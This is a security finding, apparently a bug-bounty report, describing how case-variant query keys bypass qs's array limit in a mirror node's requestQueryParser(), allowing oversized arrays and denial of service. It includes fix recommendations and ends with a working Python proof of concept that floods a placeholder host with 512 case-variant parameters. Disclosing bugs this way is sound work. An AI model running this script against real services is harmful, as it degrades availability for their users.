### Title
Case-Variant Key Bypass of `throwOnLimitExceeded` Allows Unbounded Array Growth in `requestQueryParser()`

### Summary
`requestQueryParser()` in `rest/middleware/requestHandler.js` relies on `qs`'s `throwOnLimitExceeded: true` to cap repeated query parameters at `maxRepeatedQueryParameters` (default 100). However, `qs` treats keys differing only in case (e.g., `timestamp`, `Timestamp`, `TIMESTAMP`) as entirely distinct keys, so the array-limit guard never fires. The subsequent `merge()` loop then silently combines all case-variant values into a single unbounded array, with no size check before the array is returned to the caller.

### Finding Description

**Exact code path:**

`rest/middleware/requestHandler.js` lines 15–20 — `queryOptions` is defined once at module load:
```js
const queryOptions = {
  arrayLimit: config.query.maxRepeatedQueryParameters,  // default 100
  depth: 1,
  strictDepth: true,
  throwOnLimitExceeded: true,
};
``` [1](#0-0) 

`throwOnLimitExceeded` in `qs` fires only when a **single key** appears more than `arrayLimit` times (bracket-notation or repeated identical key). Sending `timestamp=1&Timestamp=2&TIMESTAMP=3` produces `{timestamp:'1', Timestamp:'2', TIMESTAMP:'3'}` from `qs` — three distinct scalar values, no array, no limit check triggered.

Lines 54–66 — the merge loop:
```js
const parsedQueryString = qs.parse(queryString, queryOptions);
const caseInsensitiveQueryString = {};
for (const [key, value] of Object.entries(parsedQueryString)) {
  const lowerKey = key.toLowerCase();
  ...
  if (lowerKey in caseInsensitiveQueryString) {
    caseInsensitiveQueryString[lowerKey] = merge(caseInsensitiveQueryString[lowerKey], canonicalValue);
  } else {
    caseInsensitiveQueryString[lowerKey] = canonicalValue;
  }
}
``` [2](#0-1) 

`merge()` (lines 39–51) pushes every case-variant value into the same array with **no length guard**: [3](#0-2) 

**Root cause:** The design assumes `qs` will enforce the per-key repetition limit before the case-folding merge step. That assumption is false: `qs` is case-sensitive and sees N distinct keys, so `throwOnLimitExceeded` is never reached.

**Secondary check is post-allocation:** `buildFilters()` in `rest/utils.js` calls `isRepeatedQueryParameterValidLength()` only after the merged array already exists in memory: [4](#0-3) 

The array is allocated, then rejected — memory is consumed before the guard fires.

**No `parameterLimit` override:** `queryOptions` does not set `parameterLimit`, so `qs` defaults to **1000** total keys per request. An attacker can send up to 1000 distinct case-variant keys in a single request. [1](#0-0) 

### Impact Explanation
For a key like `timestamp` (9 alphabetic characters), there are 2⁹ = 512 distinct case variants. An attacker can pack 512 case-variant `timestamp` keys into one request, causing `merge()` to build a 512-element array — 5× the intended cap of 100. With `qs`'s default `parameterLimit` of 1000, longer or combined parameter names allow even larger arrays. Under concurrent load (e.g., hundreds of simultaneous requests from a botnet or a single high-throughput client), the per-request heap allocations accumulate, driving the Node.js process toward OOM or GC thrashing, degrading or halting the REST API. The REST API is the primary query interface for the mirror node; sustained unavailability prevents clients from confirming transaction finality.

### Likelihood Explanation
No authentication, API key, or special network position is required. The exploit is a plain HTTP GET with a crafted query string, reproducible with `curl` or any HTTP client. The case-variant space is large enough (hundreds of variants per parameter) to reliably exceed the intended limit on every request. The attack is stateless and trivially parallelizable, making it suitable for sustained DoS from a single machine.

### Recommendation
1. **Add a size check inside `merge()` or immediately after** — before returning from `requestQueryParser()`, iterate `caseInsensitiveQueryString` and throw (returning HTTP 400) if any value array exceeds `maxRepeatedQueryParameters`.
2. **Set `parameterLimit` in `queryOptions`** to `maxRepeatedQueryParameters` (or a small multiple) so `qs` itself rejects oversized requests before any JS processing occurs.
3. **Do not rely solely on `throwOnLimitExceeded`** for case-insensitive key deduplication — the guard operates on pre-lowercasing keys and cannot account for the merge step.

### Proof of Concept

Generate 512 case variants of `timestamp` and send them in one request:

```python
import itertools, requests

key = "timestamp"
# Generate all 2^9 = 512 case variants
variants = [
    ''.join(c.upper() if b else c.lower() for c, b in zip(key, bits))
    for bits in itertools.product([False, True], repeat=len(key))
]

# Build query string: each variant maps to a distinct value
qs = '&'.join(f'{v}=eq:1.000000001' for v in variants)
url = f'http://<mirror-node-host>:5551/api/v1/transactions?{qs}'
resp = requests.get(url)
print(resp.status_code, resp.text[:200])
```

Expected result: the server processes the request (no 400 from `qs`), `merge()` builds a 512-element array for `timestamp`, and `buildFilters` rejects it only after allocation. Sending this in a tight loop from multiple clients causes measurable heap growth and eventual service degradation.
